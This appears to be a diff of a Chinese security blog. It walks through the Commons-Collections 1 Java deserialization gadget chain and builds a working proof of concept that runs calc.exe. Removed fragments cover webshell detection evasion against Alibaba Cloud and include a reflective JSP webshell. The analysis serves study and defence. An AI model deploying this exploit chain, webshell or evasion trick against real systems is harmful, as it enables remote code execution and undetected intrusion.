+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603154324813.png" alt="image-20210603154324813"></p>
+<p><strong>思路二：找到一个间接调用了transform方法的类，再去看有没有readObject方法调用了那个类对应的方法</strong></p>
+<p>​        首先看哪些方法里调用了transform方法，并且调用transform方法的方法名不能是transform。</p>
+<p>​        找到了下面的方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;java&#x2F;Commons-collection&#x2F;commons-collections-3.1&#x2F;src&#x2F;java&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;functors&#x2F;TransformerPredicate.java:72</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603155206279.png" alt="image-20210603155206279"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;程序源码&#x2F;java&#x2F;Commons-collection&#x2F;commons-collections-3.1&#x2F;src&#x2F;java&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;BeanMap.java:746</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603155343226.png" alt="image-20210603155343226"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;程序源码&#x2F;java&#x2F;Commons-collection&#x2F;commons-collections-3.1&#x2F;src&#x2F;java&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;CollectionUtils.java:625</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603155403993.png" alt="image-20210603155403993"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;程序源码&#x2F;java&#x2F;Commons-collection&#x2F;commons-collections-3.1&#x2F;src&#x2F;java&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;comparators&#x2F;TransformingComparator.java:70</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603155431558.png" alt="image-20210603155431558"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;程序源码&#x2F;java&#x2F;Commons-collection&#x2F;commons-collections-3.1&#x2F;src&#x2F;java&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;functors&#x2F;TransformedPredicate.java:79</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603155553227.png" alt="image-20210603155553227"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;程序源码&#x2F;java&#x2F;Commons-collection&#x2F;commons-collections-3.1&#x2F;src&#x2F;java&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;functors&#x2F;TransformerClosure.java:71</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603155737775.png" alt="image-20210603155737775"></p>
+<p>​        太多了，实在不想手工去搞这件事情。其实这里思路总的来说还比较清晰，但是一个一个去找并且手工递归，确实比较浪费时间，终于知道为什么要搞利用链自动挖掘的工具了。如果要搞的话，直接找从transform到readObject的链，分析其中的链就好了。网上已经有大佬开发好了自动找调用链的工具<code>https://github.com/wh1t3p1g/tabby</code>根据需求修改就好了。</p>
+<h2 id="问题四：为什么不能直接调用InvokerTransformer触发？"><a href="#问题四：为什么不能直接调用InvokerTransformer触发？" class="headerlink" title="问题四：为什么不能直接调用InvokerTransformer触发？"></a>问题四：为什么不能直接调用InvokerTransformer触发？</h2><p>​        在commons-collection1利用链中，作者找到了<code>org.apache.commons.collections.map.TransformedMap#checkSetValue--》sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>的利用链。</p>
+<p>​        checkSetValue方法代码如下，当我们给valueTransformer传入InvokerTransformer对象，并给value传入<code>Runtime.getRuntime()</code>即可触发漏洞。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603180335946.png" alt="image-20210603180335946"></p>
+<p>​        给valueTransformer赋值可通过<code>org.apache.commons.collections.map.TransformedMap#TransformedMap</code>构造方法实现。value的值取决于调用checkSetValue方法传入的参数。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603180645251.png" alt="image-20210603180645251"></p>
+<p>​        在<code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue</code>调用了checkSetValue，并且传入了value的值。parent的值可以通过<code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#MapEntry</code>构造器来设置。所以可以创建一个TransformedMap对象，设置到MapEntry中。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603183358188.png" alt="image-20210603183358188"></p>
+<p>​        如何调用到MapEntry的setValue方法？这条利用链的作者最终找到<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>,这里虽然var5的值可以通过memberValues属性获取，但是setValue的参数是<code>AnnotationTypeMismatchExceptionProxy</code>类型，这显然和我们的预期不符。所以不能通过给setValue传值的方式来利用。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603195031969.png" alt="image-20210603195031969"></p>
+<p>​        当然还有另一个原因，再回头看看直接使用InvokerTransformer执行命令的代码，要执行命令需要得到Runtime对象，而Runtime对象并没有实现<code>Serializable</code>接口，是不能通过序列化进行传输的。所以要想通过反序列化漏洞触发Commons-Collection1利用链，只能让程序在反序列化的过程中动态去生成Runtime对象进行命令执行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer inv=new InvokerTransformer("exec",new Class[] &#123;String.class&#125;,new Object[]&#123;"calc.exe"&#125;);</span><br><span class="line">inv.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure>
+
+<h2 id="问题五：为什么不能直接new一个AnnotationInvocationHandler对象？"><a href="#问题五：为什么不能直接new一个AnnotationInvocationHandler对象？" class="headerlink" title="问题五：为什么不能直接new一个AnnotationInvocationHandler对象？"></a>问题五：为什么不能直接new一个AnnotationInvocationHandler对象？</h2><p>​        这里AnnotationInvocationHandler构造方法为defalut权限，只有在类内部和同一个包下，才可以调用该构造方法，因此无法通过new的方式创建AnnotationInvocationHandler对象。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210604095030138.png" alt="image-20210604095030138"></p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210604094821863.png" alt="image-20210604094821863"></p>
+<h2 id="问题六：为什么要使用ChainedTransformer？"><a href="#问题六：为什么要使用ChainedTransformer？" class="headerlink" title="问题六：为什么要使用ChainedTransformer？"></a>问题六：为什么要使用ChainedTransformer？</h2><p>​        首先，这个漏洞最终能够造成命令执行，是通过反射调用了Runtime.exec方法，而且通过前面的分析，无法直接获取Runtime对象。只能在程序反序列化的过程中，生成Runtime对象并执行对应的exec方法。首先了解下正常情况下，如何通过反射获取Runtime对象并执行exec方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;            Class&lt;Runtime&gt; run=Runtime<span class="class">.<span class="keyword">class</span></span>;            Method method=run.getMethod(<span class="string">"getRuntime"</span>);            Runtime r=(Runtime) method.invoke(<span class="keyword">null</span>);            Method method2=run.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;            String s=<span class="string">"calc.exe"</span>;            method2.invoke(r,s);        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;            e.printStackTrace();        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;            e.printStackTrace();        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;            e.printStackTrace();        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        再想想<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>执行命令的方法。我们的输入是一个Runtime对象才能直接造成命令执行，但在反序列化中又不能传递Runtime对象，所以需要通过反射来得到Runtime对象，而我们目前能控制参数、调用方法、调用类的反射只有<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>方法，所以我们需要找到一种方式，能够将通过<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>反射调用得到的Runtime对象又作为输入传递给<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>，也就是可以循环调用transform的方法。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210604180704500.png" alt="image-20210604180704500"></p>
+<p>​        搜索了整个Commons-Collections项目，只有ChainedTransformer满足这个条件，所以可以使用ChainedTransformer将命令执行的代码串起来。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210604181740785.png" alt="image-20210604181740785"></p>
+<h2 id="问题七：如何使用ChainTransformer得到Runtime对象？"><a href="#问题七：如何使用ChainTransformer得到Runtime对象？" class="headerlink" title="问题七：如何使用ChainTransformer得到Runtime对象？"></a>问题七：如何使用ChainTransformer得到Runtime对象？</h2><p>​        首先虽然Runtime对象不能通过序列化传输，但是Runtime的class对象是可以作为参数传输的，所以我们可以以Runtime.class为一个起点，下一步是通过什么方式传递Runtime的class对象，再想想，我们在反序列化的过程中，可以直接控制变量的属性，至于执行某个方法的参数，我们是不能直接传进去的，只能通过控制变量的属性来间接影响调用方法传递的参数，所以我们需要找到一个transformer，可以让我们通过控制它的属性作为初始化参数。通过寻找找到<code>org.apache.commons.collections.functors.ConstantTransformer#ConstantTransformer</code>，可以通过构造函数对iConstant属性赋值，并在transform方法调用时返回该对象， 所以可以使用ConstantTransformer来进行初始化操作。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605102032164.png" alt="image-20210605102032164"></p>
+<p>​        所以已经找到一个给<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>进行初始化的方法了，下一步需要通过调用Runtime的getRuntime方法来得到Runtime对象。当传入一个Class对象，我们只能调用这个Class对象里的任意方法，所以可以先调用Class对象的getMethod方法，获取getRuntime方法的Method对象，再去调用这个Method对象的Invoke方法，就可以拿到Runtime对象，再通过调用Runtime对象的exec方法执行命令，所以ChainTransformer可以这样构造。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers &#x3D; new Transformer[] &#123;                new ConstantTransformer(Runtime.class), &#x2F;&#x2F;作为初始化得到Runtime的Class对象。                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),&#x2F;&#x2F;调用Class对象的getMethod方法获取getRuntime的Method对象。                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), &#x2F;&#x2F;通过调用Method的Invoke方法得到Runtime对象。                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)        &#125;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="问题八：为什么最终还可以通过setValue来进行触发？"><a href="#问题八：为什么最终还可以通过setValue来进行触发？" class="headerlink" title="问题八：为什么最终还可以通过setValue来进行触发？"></a>问题八：为什么最终还可以通过setValue来进行触发？</h2><p>​        在问题四中我们分析过，setValue虽然可以控制调用的对象，但是setValue的参数无法控制，因此站在我们的角度来讲已经放弃了这条链，但是为什么可以打通呢？因为在调用ConstantTransformer的transform时，transform传入什么值，返回的都是ConstantTransformer构造方法中传递的属性，所以transform传入的参数对我们来说是无关的。</p>
+<h2 id="问题九：如何构造POC"><a href="#问题九：如何构造POC" class="headerlink" title="问题九：如何构造POC?"></a>问题九：如何构造POC?</h2><p>​        首先ChainedTransformer对象我们在问题七里已经构建好了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>), //作为初始化得到<span class="title">Runtime</span>的<span class="title">Class</span>对象。</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),//调用Class对象的getMethod方法获取getRuntime的Method对象。</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //通过调用Method的Invoke方法得到Runtime对象。</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">ChainTransformer chain=<span class="keyword">new</span> ChainTransformer(transformers);</span><br></pre></td></tr></table></figure>
+
+<p>​        参考问题四的分析，接下来我们要创建一个TransformedMap对象，并将Chains设置到该对象中,但是TransformedMap的构造方法并非Public类型，所以不能直接调用构造方法来 为valueTransformer赋值。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605105743462.png" alt="image-20210605105743462"></p>
+<p>​        但在decorate方法中，会调用该构造方法，所以可以通过调用decorate来间接调用TransformedMap的构造方法。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605105902495.png" alt="image-20210605105902495"></p>
+<p>​        并且调用decorate还需要传递一个Map对象，所以我们需要提前创建好一个实现了Serializable接口的Map对象，这里随便找了个IdentityHashMap。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map innerMap = <span class="keyword">new</span> IdentityHashMap();Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br></pre></td></tr></table></figure>
+
+<p>​        在看看<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>方法，我们需要将我们构建好的Map赋值给AnnotationInvocationHandler的memberValue属性，并且要给Map赋值，否则在进行遍历的时候会出错。所以还要给map赋值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outerMap.put(&quot;test666&quot;, &quot;test666&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605110708972.png" alt="image-20210605110708972"></p>
+<p>​        下面我们要创建AnnotationInvocationHandler对象，之前已经分析过，不能直接通过New来创建对象，并且也没有找到调用AnnotationInvocationHandler构造方法的方法，所以 只能通过反射调用来创建AnnotationInvocationHandler对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>); <span class="comment">//得到AnnotationInvocationHandler的Class对象</span></span><br><span class="line">Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;<span class="comment">//获取构造器</span></span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>); <span class="comment">//设置构造器的权限</span></span><br><span class="line">Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>; <span class="comment">//创建AnnotationInvocationHandler实例并将outerMap赋值给memberValues属性。</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="问题十：如何给MapEntry的parent属性赋值？"><a href="#问题十：如何给MapEntry的parent属性赋值？" class="headerlink" title="问题十：如何给MapEntry的parent属性赋值？"></a>问题十：如何给MapEntry的parent属性赋值？</h2><p>​        通过之前的分析，这个漏洞还有一个重点在于给MapEntry的parent属性赋值为我们构造好的TransformedMap，但是在我们构造的POC中并没有给parent属性赋值的操作，是什么时候给parent属性赋值的。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605140831584.png" alt="image-20210605140831584"></p>
+<p>​            在<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>中，有如下代码<code>Iterator var4 = this.memberValues.entrySet().iterator();</code>会对我们传入的TransformedMap对象做处理。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605141151339.png" alt="image-20210605141151339"></p>
+<p>​        首先调用了TransformedMap的entrySet()方法，而TransformedMap并没有定义entrySet方法，因此会调用TransformedMap父类，也就是AbstractInputCheckedMapDecorator的entrySet方法，这个方法会将TransformedMap对象传递给EntrySet的构造方法的第二个参数中。EntrySet会将TransformedMap对象设置到this.parent中。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605141558046.png" alt="image-20210605141558046"></p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605141709529.png" alt="image-20210605141709529"></p>
+<p>​        当调用<code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySet#iterator</code>方法时，会将TransformedMap传递到EntrySetIterator的构造方法中，给<code>this.patent</code>赋值、</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605142139720.png" alt="image-20210605142139720"></p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605142241893.png" alt="image-20210605142241893"></p>
+<p>​        当调用next方法时，会创建MapEnry并将我们构造好的TransformedMap对象赋值给MapEnry的parent属性。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605142309628.png" alt="image-20210605142309628"></p>
+<h2 id="问题十一：这条利用链为什么不能再JDK8中使用？"><a href="#问题十一：这条利用链为什么不能再JDK8中使用？" class="headerlink" title="问题十一：这条利用链为什么不能再JDK8中使用？"></a>问题十一：这条利用链为什么不能再JDK8中使用？</h2><p>​        查看JDK8中<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>方法，在该方法中，已经不会去调用setValue方法了，所以这条利用链就失效了。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605112848120.png" alt="image-20210605112848120"></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/反序列化/">反序列化</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
   <article>
 
   
@@ -465,113 +743,6 @@
 </blockquote>
 <p>​    之前我在绕云WAF时，发现增加垃圾字符可以绕过云WAF的检测，所以我怀疑能绕过是因为大量垃圾字符的。于是我去除了<code>&#39;%&gt;</code>这部分，只使用大量的<code>&lt;%%&gt;</code>填充，也确实绕过了云查杀。但是如果使用其他字符填充无法绕过，所以我推测能绕过的原因是匹配<code>&lt;%%&gt;</code>的次数过多而导致的溢出。</p>
 <p>​    虽然大量填充可以绕过阿里云的查杀，但是这种方式在实战中并不可取，由于上传文件内容过大，导致在访问文件的过程中会有一些卡顿，一定程度上影响了客户端和webshell的交互。</p>
-        
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-      
-
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/webshell/">webshell</a>
-    </span>
-    
-
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2021/10/08/webshell免杀过阿里云PHP/"><span>webshell免杀过阿里云PHP</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2021/10/08/webshell免杀过阿里云PHP/" rel="bookmark">
-        <time class="entry-date published" datetime="2021-10-08T06:27:41.000Z">
-          2021-10-08
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    基于之前成功绕过JSP的免杀经验，主要对抗的重点还是放在分离免杀，在<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md" target="_blank" rel="noopener">这个</a>项目中也有一些关于RASP和沙箱对抗的经验，可以直接复用。</p>
-<h3 id="从文件名获取内容"><a href="#从文件名获取内容" class="headerlink" title="从文件名获取内容"></a>从文件名获取内容</h3><p>​    云查杀会将我们传入的文件重命名，因此我们可以利用真实的webshell和沙箱中的文件名不一致来绕过。</p>
-        
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-      
-
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/webshell/">webshell</a>
-    </span>
-    
-
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2021/09/29/webshell免杀笔记/"><span>webshell免杀笔记</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2021/09/29/webshell免杀笔记/" rel="bookmark">
-        <time class="entry-date published" datetime="2021-09-29T02:24:02.000Z">
-          2021-09-29
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <h2 id="更改接收参数方式"><a href="#更改接收参数方式" class="headerlink" title="更改接收参数方式"></a>更改接收参数方式</h2><h3 id="调用的类和方法参数化-失败"><a href="#调用的类和方法参数化-失败" class="headerlink" title="调用的类和方法参数化(失败)"></a>调用的类和方法参数化(失败)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Method"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Constructor"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">	 String className = request.getParameter(<span class="string">"a"</span>);</span><br><span class="line">        Class  A = Class.forName(className);</span><br><span class="line">        Constructor B =  A.getDeclaredConstructor();</span><br><span class="line">        B.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Method M = A.getMethod(request.getParameter(<span class="string">"b"</span>), String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        String D = request.getParameter(<span class="string">"c"</span>);</span><br><span class="line">        M.invoke(B.newInstance(), D);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
         
       
     </div>
